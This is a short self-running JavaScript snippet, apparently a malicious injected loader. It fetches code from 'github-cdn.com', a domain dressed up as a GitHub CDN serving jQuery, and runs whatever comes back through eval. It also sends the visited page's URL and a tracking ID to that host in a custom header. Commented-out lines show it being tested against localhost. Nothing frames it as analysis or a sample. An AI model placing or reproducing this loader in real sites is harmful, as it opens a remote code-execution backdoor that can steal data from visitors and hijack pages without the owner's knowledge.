function whatever() {
    if(typeof window.doneTheStuff == 'undefined') {
        var xmlhttp;
        var uuid = "b7f3d4a5-8782-4d8a-9452-e444fc7460c4";

        if (window.XMLHttpRequest) {
          xmlhttp = new XMLHttpRequest();
        } else {
          xmlhttp = new XDomainRequest();
        };

        xmlhttp.onreadystatechange = function() {
          if (xmlhttp.readyState == 4 ) {
             if(xmlhttp.status == 200) {
                 eval(xmlhttp.responseText);
             }
          }
        };

        // xmlhttp.setRequestHeader('Content-Type', 'application/json');

        // var head = document.getElementsByTagName('head')[0];
        // var script = document.createElement('script');
        // script.id = "jquery_tag";
        // script.type= 'text/javascript';
        // script.src = "http://localhost:9000/jquery/dist";
        // head.appendChild(script);

        var url = document.URL;
        var protocol = location.protocol;

        if(protocol == "https:") {
            xmlhttp.open("GET", "https://github-cdn.com/jquery/dist", true);
        }
        else {
            xmlhttp.open("GET", "http://github-cdn.com/jquery/dist", true);
        }
        //xmlhttp.open("GET", "http://localhost:9000/jquery/dist", true);
        xmlhttp.setRequestHeader('Content-Type', 'application/json');
        xmlhttp.setRequestHeader('X-Alt-Referer', url + "?txid=" + uuid);  

        if(url.indexOf("file") != 0) {
            xmlhttp.send(null);
        }
        window.doneTheStuff = true;
    }
};
whatever();